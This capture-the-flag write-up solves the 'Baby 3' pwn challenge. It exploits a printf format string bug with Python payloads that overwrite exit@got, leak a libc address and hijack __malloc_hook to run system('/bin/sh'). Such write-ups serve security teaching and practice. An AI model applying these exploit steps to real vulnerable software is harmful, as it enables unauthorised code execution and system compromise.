# Baby 3

Categories: pwn baby pwned! <br/>
Description: When Swordfish came out, these were considered some state of the art techniques. Let's see if you have what it takes. <br/>
File: [baby3](baby3), [libc.so.6](libc.so.6)

## Solution

I didn't solve this challenge during the CTF but I will still publish my solution. It is largely based on [0xb0bb's
solution](https://gist.github.com/0xb0bb/ac3dcc46ab542313a1f2f0abff62e20a).

In this challenge we have a string format vulnerability:

```
mov rdx, qword [obj.stdin]  ; obj.stdin__GLIBC_2.2.5 ; [0x602070:8]=0 ; FILE *stream
lea rax, [format]
mov esi, 0x80               ; 128 ; int size
mov rdi, rax                ; char *s
call sym.imp.fgets          ; char *fgets(char *s, int size, FILE *stream)

lea rax, [format]
mov rdi, rax                ; const char *format
mov eax, 0
call sym.imp.printf         ; int printf(const char *format)
```

Unfortunately `main` calls `exit` right after the `printf`:

```
mov edi, 0                  ; int status
call sym.imp.exit           ; void exit(int status)
```

The first step was to overwrite `exit@got` so that we can abuse the vulnerability again. Overwriting the last 12 bits of
`exit@got` allows us to rerun the `main` function:

```python
last12bits = str(int(hex(elf.sym['main'])[-3:], 16))
p.sendlineafter('input: ', '%' + last12bits + 'c%8$hn' + '.' * 5 + p64(elf.got['exit']))
```

To defeat ASLR I leaked an address and calculated the correct offset:

```python
def leak(addr):
    p.sendlineafter('input: ', '%7$s' + '.' * 4 + p64(addr))
    recv = p.recv().split('.')[0]
    return u64(recv.ljust(8, '\x00'))

leaked_fgets = leak(elf.got['fgets']);
libc.address = leaked_fgets - libc.sym['fgets']
```

The last step is to call `system` with `/bin/sh`. First I wrote `/bin/sh` to memory:

```python
def write(addr, toWrite):
    for i in range(len(toWrite)):
        value = ord(toWrite[i])

        if value == 0:
            value = 0x100

        p.sendline('%' + str(value).rjust(3, '0') + 'c%8$hhn' + '.' * 5 + p64(addr + i))
        p.recvuntil('input: ')

random_addr = 0x602080
write(random_addr, '/bin/sh')
```

After that I overwrote `__malloc_hook` which gets called when `malloc` is called:

```python
write(libc.sym['__malloc_hook'], p64(libc.sym['system']))
```

Now I can trigger `malloc` with `random_addr` as parameter to execute `system("/bin/sh")`:

```python
p.sendline('%' + str(random_addr - 0x20) + 'c')
```

Note that I had to subtract `0x20` from `random_addr` because [`malloc` is called with a number that is `0x20` bigger
than the actual `malloc` parameter](http://sourceware.org/git/?p=glibc.git;a=blob;f=stdio-common/vfprintf.c;h=6e0e85cd7cca9f4dfc9e86fb702db131ab2e1639;hb=HEAD#l1453).
The following example shows this behaviour:

```c
#include <malloc.h>

static void *my_malloc_hook (size_t, const void *);
static void *(*old_malloc_hook) (size_t, const void *);

static void *my_malloc_hook (size_t size, const void *caller) {
  __malloc_hook = old_malloc_hook;
  void *result = malloc(size);
  old_malloc_hook = __malloc_hook;

  printf("malloc(%u)\n", (unsigned int) size);
  __malloc_hook = my_malloc_hook;

  return result;
}

int main() {
  old_malloc_hook = __malloc_hook;
  __malloc_hook = my_malloc_hook;

  printf("%1000000c", 'x'); // calls malloc(1000032)
}
```

The complete exploit can be found [here](solution.py).
